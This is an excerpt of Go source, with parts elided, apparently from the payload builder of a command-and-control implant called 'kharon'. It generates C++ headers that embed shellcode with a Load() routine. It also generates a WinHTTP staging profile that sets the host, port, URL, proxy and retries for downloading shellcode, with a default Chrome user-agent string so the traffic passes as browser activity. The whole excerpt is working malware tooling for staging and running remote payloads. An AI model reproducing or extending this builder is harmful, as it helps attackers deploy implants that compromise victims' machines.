...
type AgentConfig struct {
	...
	ShellcodeSource     string `json:"shellcode_source"`
	StagingHost         string `json:"staging_host"`
	StagingURL          string `json:"staging_url"`
	StagingPort         int    `json:"staging_port"`
	StagingSecure       bool   `json:"staging_secure"`
	StagingUserAgent    string `json:"staging_useragent"`
	StagingMethod       string `json:"staging_method"`
	StagingHeaders      string `json:"staging_headers"`
	StagingProxy        string `json:"staging_proxy"`
	StagingMaxRetries   int    `json:"staging_max_retries"`
	StagingRetryDelay   int    `json:"staging_retry_delay"`
 
	kharon_data []byte
}

var stagedSources = map[string]bool{
	"network": true,
	"smb":     true,
	"rpc":     true,
}
...
func gen_shellcode_header(shellcode []byte, section string, customName string) string {
	...
	sb.WriteString("\n    };\n\n")
	sb.WriteString("    BOOL Load();\n")
	sb.WriteString("}\n")
 
	return sb.String()
}

func gen_staging_profile(cfg *AgentConfig) string {
	host := cfg.StagingHost
	if host == "" {
		host = "127.0.0.1"
	}
	url := cfg.StagingURL
	...
	port := cfg.StagingPort
	if port == 0 {
		port = 443
	}
	method := cfg.StagingMethod
	if method == "" {
		method = "GET"
	}
	userAgent := cfg.StagingUserAgent
	if userAgent == "" {
		userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
	}
	maxRetries := cfg.StagingMaxRetries
	if maxRetries <= 0 {
		maxRetries = 3
	}
	retryDelay := cfg.StagingRetryDelay
	if retryDelay <= 0 {
		retryDelay = 2000
	}
 
	secure := "true"
	if !cfg.StagingSecure {
		secure = "false"
	}
 
	headers := strings.ReplaceAll(cfg.StagingHeaders, "\n", "\\r\\n")
	...
	sb.WriteString("#pragma once\n\n")
	sb.WriteString("// Autogenerated staging profile\n")
	sb.WriteString("// DO NOT EDIT MANUALLY\n\n")
	sb.WriteString("#include <winhttp.h>\n\n")
	sb.WriteString("namespace StagingProfile {\n\n")
 
	sb.WriteString(fmt.Sprintf("    constexpr wchar_t Host[]      = L\"%s\";\n", host))
	sb.WriteString(fmt.Sprintf("    constexpr wchar_t Url[]       = L\"%s\";\n", url))
	sb.WriteString(fmt.Sprintf("    constexpr INTERNET_PORT Port  = %d;\n", port))
	sb.WriteString(fmt.Sprintf("    constexpr bool Secure         = %s;\n\n", secure))
 
	sb.WriteString(fmt.Sprintf("    constexpr wchar_t Method[]    = L\"%s\";\n", strings.ToUpper(method)))
	sb.WriteString(fmt.Sprintf("    constexpr wchar_t UserAgent[] = L\"%s\";\n", userAgent))
	sb.WriteString(fmt.Sprintf("    constexpr wchar_t Headers[]   = L\"%s\";\n\n", headers))
 
	sb.WriteString(fmt.Sprintf("    constexpr wchar_t ProxyAddr[] = L\"%s\";\n\n", cfg.StagingProxy))
 
	sb.WriteString(fmt.Sprintf("    constexpr int MaxRetries      = %d;\n", maxRetries))
	sb.WriteString(fmt.Sprintf("    constexpr int RetryDelayMs    = %d;\n\n", retryDelay))
